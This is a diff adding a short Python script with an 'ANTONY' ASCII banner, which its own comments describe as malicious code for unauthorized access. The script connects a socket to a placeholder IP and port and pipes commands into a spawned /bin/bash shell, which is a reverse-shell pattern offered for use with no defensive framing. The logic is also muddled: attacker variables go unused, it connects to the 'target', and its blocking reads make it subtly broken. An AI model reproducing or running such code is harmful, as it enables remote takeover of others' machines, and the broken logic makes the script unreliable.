@@ -1,0 +1,43 @@
+print("""
+ 	   █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ██╗██╗   ██╗
+	  ██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗  ██║╚██╗ ██╔╝
+ 	  ███████║██╔██╗ ██║   ██║   ██║   ██║██╔██╗ ██║ ╚████╔╝ 
+ 	  ██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╗██║  ╚██╔╝  
+ 	  ██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚████║   ██║   
+    ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   
+                                                        
+""")
+#!/usr/bin/env python
+
+import socket
+import subprocess
+
+# Malicious code to gain unauthorized access to a target's computer system
+
+target_ip = "192.168.1.100"  # Replace with the target's IP address
+target_port = 1234  # Replace with the target's listening port
+
+# Open a reverse shell connection to the attacker's machine
+attacker_ip = "127.0.0.1"  # Replace with the attacker's IP address
+attacker_port = 4444  # Replace with the attacker's listening port
+
+# Create a socket object
+s = socket.socket()
+
+# Connect to the target's machine
+s.connect((target_ip, target_port))
+
+# Open a shell connection
+proc = subprocess.Popen(['/bin/bash'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+# Loop to send and receive data between the target and attacker's machines
+while True:
+    # Receive data from the target's machine
+    received_data = s.recv(1024)
+    if len(received_data) > 0:
+        # Send data to the shell connection
+        proc.stdin.write(received_data)
+        # Get the output from the shell connection
+        output = proc.stdout.read(1024)
+        # Send the output to the target's machine
+        s.send(output)
